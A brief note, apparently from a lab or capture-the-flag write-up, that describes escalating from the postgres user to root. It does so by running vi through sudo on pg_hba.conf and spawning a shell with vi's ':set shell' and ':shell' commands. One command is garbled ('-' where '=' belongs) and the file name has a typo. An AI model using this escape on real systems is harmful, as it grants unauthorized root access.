postgres can run vi on the file `/etc/postgresql/11/main/pg_hba.conf`.

postgres can only run as root on the file /etc/postgresql/11/main/ph_hba.conf

So I have to run `sudo vi /etc/postgresql/11/main/pg_hba.conf`

Then in command mode in vi type `:set shell - /bin/sh` then again `:shell` to get root shell.
